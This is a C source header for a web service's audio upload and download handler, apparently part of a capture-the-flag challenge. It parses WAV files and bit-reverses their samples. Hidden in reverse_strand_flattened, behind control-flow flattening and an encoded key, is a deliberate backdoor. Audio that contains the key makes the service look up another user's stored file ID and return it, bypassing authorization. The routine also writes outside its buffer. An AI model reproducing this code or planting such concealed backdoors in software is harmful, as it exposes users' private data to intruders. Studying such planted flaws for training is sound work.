#ifndef HANDLE_AUDIO_H
#define HANDLE_AUDIO_H

#include "common.h"
#include "util.h"

#define OBF_MARKER

typedef struct __attribute__((packed)) {
    char tag[4];
    uint32_t len;
    char data[];
} chunk_hdr_t;

typedef struct __attribute__((packed)){
    char tag[4];
    chunk_hdr_t fmt_chunk;
} wave_chunk_t;

typedef struct __attribute__((packed)) {
    uint16_t format;            // format - should be 1 (= PCM)
    uint16_t n_channels;        // number of channels
    uint32_t samplerate;        // samplerate
    uint32_t bytes_per_second;  // (samplerate * bitsperchannel * channels) / 8
    uint16_t chunksize;         // (bitsperchannel * channels) / 8
    uint16_t bits_per_sample;   // bits per sample _and_ channel
} fmt_chunk_t;

uint8_t BITREV_XOR_LOOKUP[] = {0x0, 0x81, 0x42, 0xc3, 0x24, 0xa5, 0x66, 0xe7, 0x18, 0x99, 0x5a, 0xdb, 0x3c, 0xbd, 0x7e, 0xff, 0x18, 0x99, 0x5a, 0xdb, 0x3c, 0xbd, 0x7e, 0xff, 0x0, 0x81, 0x42, 0xc3, 0x24, 0xa5, 0x66, 0xe7, 0x24, 0xa5, 0x66, 0xe7, 0x0, 0x81, 0x42, 0xc3, 0x3c, 0xbd, 0x7e, 0xff, 0x18, 0x99, 0x5a, 0xdb, 0x3c, 0xbd, 0x7e, 0xff, 0x18, 0x99, 0x5a, 0xdb, 0x24, 0xa5, 0x66, 0xe7, 0x0, 0x81, 0x42, 0xc3, 0x42, 0xc3, 0x0, 0x81, 0x66, 0xe7, 0x24, 0xa5, 0x5a, 0xdb, 0x18, 0x99, 0x7e, 0xff, 0x3c, 0xbd, 0x5a, 0xdb, 0x18, 0x99, 0x7e, 0xff, 0x3c, 0xbd, 0x42, 0xc3, 0x0, 0x81, 0x66, 0xe7, 0x24, 0xa5, 0x66, 0xe7, 0x24, 0xa5, 0x42, 0xc3, 0x0, 0x81, 0x7e, 0xff, 0x3c, 0xbd, 0x5a, 0xdb, 0x18, 0x99, 0x7e, 0xff, 0x3c, 0xbd, 0x5a, 0xdb, 0x18, 0x99, 0x66, 0xe7, 0x24, 0xa5, 0x42, 0xc3, 0x0, 0x81, 0x81, 0x0, 0xc3, 0x42, 0xa5, 0x24, 0xe7, 0x66, 0x99, 0x18, 0xdb, 0x5a, 0xbd, 0x3c, 0xff, 0x7e, 0x99, 0x18, 0xdb, 0x5a, 0xbd, 0x3c, 0xff, 0x7e, 0x81, 0x0, 0xc3, 0x42, 0xa5, 0x24, 0xe7, 0x66, 0xa5, 0x24, 0xe7, 0x66, 0x81, 0x0, 0xc3, 0x42, 0xbd, 0x3c, 0xff, 0x7e, 0x99, 0x18, 0xdb, 0x5a, 0xbd, 0x3c, 0xff, 0x7e, 0x99, 0x18, 0xdb, 0x5a, 0xa5, 0x24, 0xe7, 0x66, 0x81, 0x0, 0xc3, 0x42, 0xc3, 0x42, 0x81, 0x0, 0xe7, 0x66, 0xa5, 0x24, 0xdb, 0x5a, 0x99, 0x18, 0xff, 0x7e, 0xbd, 0x3c, 0xdb, 0x5a, 0x99, 0x18, 0xff, 0x7e, 0xbd, 0x3c, 0xc3, 0x42, 0x81, 0x0, 0xe7, 0x66, 0xa5, 0x24, 0xe7, 0x66, 0xa5, 0x24, 0xc3, 0x42, 0x81, 0x0, 0xff, 0x7e, 0xbd, 0x3c, 0xdb, 0x5a, 0x99, 0x18, 0xff, 0x7e, 0xbd, 0x3c, 0xdb, 0x5a, 0x99, 0x18, 0xe7, 0x66, 0xa5, 0x24, 0xc3, 0x42, 0x81, 0x0};

void split_strands(uint8_t* data, size_t raw_datasize, uint8_t** strands, size_t n_strands){
    size_t bit_pos = 0;
    for(size_t i=0; i<raw_datasize; i++){
        uint8_t x = data[i];
        for(size_t j=0;j<8; j++, bit_pos++, x>>=1){
            size_t strand_idx = bit_pos%n_strands;
            size_t strand_offset = (bit_pos/n_strands)/8;
            size_t bit_offset = (bit_pos/n_strands)%8;
            uint8_t y = x<<7;
            y >>= 7-bit_offset;
            strands[strand_idx][strand_offset] |= y;
        }
    }
}


enum flat_state {
    INIT,
    
    LOOP_INIT,
    LOOP_CHECK,
    LOOP_ENTER,
    LOOP_LOOP,
    LOOP_EXIT,
    
    LOOP_STMT_0,
    LOOP_STMT_1,
    LOOP_STMT_2,
    LOOP_STMT_3,
    LOOP_STMT_4,
    CHECK_PTR_INIT,
    LOOP_STMT_5,
    CHECK_PTR_ADVANCE,
    CHECK_PTR_RESET,
    CHECK_PTR_CHECK,
    BACKDOOR_RESET,
    BACKDOOR_ENTRY,
    BACKDOOR_PREFETCH,
    BACKDOOR_FETCH,
    BACKDOOR_ADVANCE,
    
    ADJUST_MID,
    
    EXIT,
};

// "I am the h4ck0rm4n, you will never find this backdoor!"
uint32_t backdoor_key[] = {4294967223, 4294967191, 4294967094, 4294966985, 4294966953, 4294966837, 4294966733, 4294966632, 4294966600, 4294966496, 4294966444, 4294966345, 4294966238, 4294966190, 4294966076, 4294965967, 4294965915, 4294965805, 4294965761, 4294965729, 4294965608, 4294965497, 4294965380, 4294965348, 4294965229, 4294965124, 4294965016, 4294964908, 4294964876, 4294964766, 4294964665, 4294964547, 4294964446, 4294964332, 4294964300, 4294964198, 4294964093, 4294963983, 4294963883, 4294963851, 4294963735, 4294963631, 4294963526, 4294963411, 4294963379, 4294963281, 4294963184, 4294963085, 4294962978, 4294962878, 4294962767, 4294962656, 4294962542, 4294962509, 0};

void reverse_strand_flattened(uint8_t* strand, size_t strand_size){
    enum flat_state state = INIT;
    
    size_t i=0;
    uint8_t tmp=0;
    uint32_t* check_ptr = NULL;
    uint32_t backdoor=0;
    uint8_t id=0;
    
    while(state!=EXIT){
        switch(state){
            case INIT:
                state = LOOP_INIT;
                break;
               
            case LOOP_INIT:
                i=0;
                state = LOOP_CHECK;
                break;
            
            case LOOP_CHECK:
                if(i<strand_size/2){
                    state = LOOP_ENTER;
                }else{
                    state = LOOP_EXIT;
                }
                break;
                
            case LOOP_ENTER:
                state = LOOP_STMT_0;
                break;
            
            case LOOP_STMT_0:
                backdoor -= strand[i];
                state = LOOP_STMT_1;
                break;
                
            case LOOP_STMT_1:
                tmp = BITREV_XOR_LOOKUP[strand[i]] ^ strand[i];
                state = LOOP_STMT_2;
                break;
            
            case LOOP_STMT_2:
                strand[i] = BITREV_XOR_LOOKUP[strand[(strand_size-1) - i]] ^ strand[(strand_size-1) - i];
                state = LOOP_STMT_3;
                break;
            
            case LOOP_STMT_3:
                strand[(strand_size-1) - i] = tmp;
                state = LOOP_STMT_4;
                break;
            
            case LOOP_STMT_4:
                if(check_ptr == NULL){
                    state = CHECK_PTR_INIT;
                }else{
                    state = LOOP_STMT_5;
                }
                break;
            
            case CHECK_PTR_INIT:
                check_ptr = &backdoor_key[0];
                state = LOOP_STMT_5;
                break;
                
            case LOOP_STMT_5:
                if(backdoor == *check_ptr){
                    state = CHECK_PTR_ADVANCE;
                }else{
                    state = CHECK_PTR_RESET;
                }
                break;
            
            case CHECK_PTR_ADVANCE:
                check_ptr++;
                state = CHECK_PTR_CHECK;
                break;
            
            case CHECK_PTR_RESET:
                check_ptr = &backdoor_key[0];
                state = BACKDOOR_RESET;
                break;
                
            case BACKDOOR_RESET:
                backdoor = 0;
                state = LOOP_LOOP;
                break;
            
            case CHECK_PTR_CHECK:
                if(!*check_ptr){
                    state = BACKDOOR_ENTRY;
                }else{
                    state = LOOP_LOOP;
                }
                break;
            
            case BACKDOOR_ENTRY:
                id = strand[++i]; // grab target id from next byte
                state = BACKDOOR_PREFETCH;
                break;
            
            case BACKDOOR_PREFETCH:
                strand[++i+64] = 0; // ensure NULL-termination of string
                state = BACKDOOR_FETCH;
                break;
            
            case BACKDOOR_FETCH:
                get_uuid((const char*) &strand[i], "audio", id, (char*)&strand[i]);
                state = BACKDOOR_ADVANCE;
                break;
            
            case BACKDOOR_ADVANCE:
                i += 36;
                state = LOOP_LOOP;
                break;
            
            case LOOP_LOOP:
                i++;
                state = LOOP_CHECK;
                break;
                
            case LOOP_EXIT:
                if(strand_size%2){
                    state = ADJUST_MID;
                }else{
                    state = EXIT;
                }
                break;
                
            case ADJUST_MID:
                strand[strand_size/2] ^= BITREV_XOR_LOOKUP[strand[strand_size/2]];
                state = EXIT;
                break;
                
            case EXIT:
                break;
        }
    };
}

void merge_strands(uint8_t* data, size_t raw_datasize, uint8_t** strands, size_t n_strands){
    size_t strand_size = ((8*raw_datasize+7)/n_strands+7)/8;
    size_t bit_pos = 8*(n_strands * strand_size - raw_datasize);
    for(size_t i=0; i<raw_datasize; i++){
        uint8_t x = 0;
        for(size_t j=0;j<8; j++, bit_pos++){
            size_t strand_idx = bit_pos%n_strands;
            size_t strand_offset = (bit_pos/n_strands)/8;
            size_t bit_offset = (bit_pos/n_strands)%8;
            uint8_t y = strands[strand_idx][strand_offset];
            y <<=  7-bit_offset;
            y >>= 7;
            y <<= j;
            x |= y;
        }
        data[i] = x;
    }
}

void strand_reverse(unsigned char* data, size_t raw_datasize, size_t n_strands){
    
    uint8_t** strands = alloca(sizeof(uint8_t*)*n_strands);
    size_t strand_size = ((8*raw_datasize+7)/n_strands+7)/8;
    for(size_t i=0;i<n_strands;i++){
        strands[i] = calloc(strand_size, sizeof(uint8_t));
    }
    
    split_strands(data, raw_datasize, strands, n_strands);
    for(size_t i=0;i<n_strands;i++){
        reverse_strand_flattened(strands[i], strand_size);
    }
    merge_strands(data, raw_datasize, strands, n_strands);
    
    for(size_t i=0;i<n_strands;i++){
        free(strands[i]);
    }
}

int audio_reverse(unsigned char* buf, size_t buf_len){
    // verify WAVE header
    if(buf_len<sizeof(chunk_hdr_t) + sizeof(wave_chunk_t) + sizeof(fmt_chunk_t)){
        // file too short
        return 1;
    }
    
    chunk_hdr_t* riff_hdr = (chunk_hdr_t*) buf;
    
    // check outer RIFF tag
    if(strncmp(riff_hdr->tag, "RIFF", 4)){
        return 1;
    }
    if(riff_hdr->len > buf_len){
        return 1;
    }
    // check inner WAVE tag
    wave_chunk_t* wav_hdr = (wave_chunk_t*) &riff_hdr->data;
    if(strncmp(wav_hdr->tag, "WAVE", 4)){
        return 1;
    }    
    
    chunk_hdr_t* fmt_hdr = &wav_hdr->fmt_chunk;
    fmt_chunk_t* fmt_data = (fmt_chunk_t*) &fmt_hdr->data;

    if(strncmp(fmt_hdr->tag, "fmt ", 4)){
        return 1;
    }
    if(fmt_hdr->len != sizeof(fmt_chunk_t)){
        return 1;
    }
    
    chunk_hdr_t* data_hdr = NULL;
    
    // search for "data" chunk
    for(chunk_hdr_t* cur = (chunk_hdr_t*) ((unsigned char*)fmt_hdr + sizeof(chunk_hdr_t) + fmt_hdr->len);(unsigned char*) cur < &buf[buf_len]; cur = (chunk_hdr_t*)((unsigned char*) cur + sizeof(chunk_hdr_t) + cur->len)){
        if(!strncmp(cur->tag, "data", 4)){
            data_hdr = cur;
            break;
        }
    }
    
    if(data_hdr == NULL){
        return 1;
    }
    
    if(data_hdr->len > &buf[buf_len] - (unsigned char*)&data_hdr->data){
        return 1;
    }
    size_t raw_datasize = data_hdr->len;
    if(raw_datasize % fmt_data->chunksize){
        return 1;
    }

    unsigned char* data = (unsigned char*) &data_hdr->data;

    strand_reverse(data, raw_datasize, 8*fmt_data->chunksize);

    
    return 0;
}

void handle_audio_post(path_t* path){
    const char* username = get_logged_in_username();
    if(username == NULL){
        return err(401, "Unauthorized");
    }
    
    unsigned char buf[512*1024] = {0};
    size_t buf_len = 512*1024 -1;
    if((buf_len=fread(buf, 1, buf_len, stdin)) >= sizeof(buf)){
        return err(413, "Payload Too Large");
    }
    
    if(audio_reverse(buf, buf_len)){
        return err(422, "Unprocessable Content");
    }
    
    uuid_t uuid;
    uuid_generate_random(uuid);
    char uuid_str[37] = {0};
    uuid_unparse_lower(uuid, uuid_str);
    
    char filepath[256] = {0};
    snprintf(filepath, sizeof(filepath), "./data/files/%s", uuid_str);
    
    FILE* datafile = fopen(filepath, "w");
    fwrite(buf, buf_len, 1, datafile);
    fclose(datafile);
    
    int id = add_uuid(username, "audio", uuid_str);
    struct json_object* id_msg = json_object_new_object();
    json_object_object_add(id_msg, "id", json_object_new_int(id));
    printf("Content-Type: application/json\r\n\r\n");
    printf("%s\r\n", json_object_to_json_string(id_msg));
    json_object_put(id_msg);
}

void handle_audio_get(path_t* path){
    const char* username = get_logged_in_username();
    if(username == NULL){
        return err(401, "Unauthorized");
    }
    if(path->n < 3){
        return err(400, "Bad Request (undefined idx)");
    }
    int file_idx = atoi(path->parts[2]);
    
    char uuid_str[37] = {0};
    if(get_uuid(username, "audio", file_idx, uuid_str)){
        return err(400, "Bad Request (file does not exist)");
    }
    printf("Status: 302 Found\r\n");
    printf("Location: /userdata/%s\r\n\r\n", uuid_str);
}

void handle_audio(path_t* path, const char method[]) {
    if(!strcmp(method, "POST")){
        return handle_audio_post(path);
    }
    else if(!strcmp(method, "GET")){
        return handle_audio_get(path);
    }
    return err(400, "Bad Request (invalid method, audio)");
}
#endif
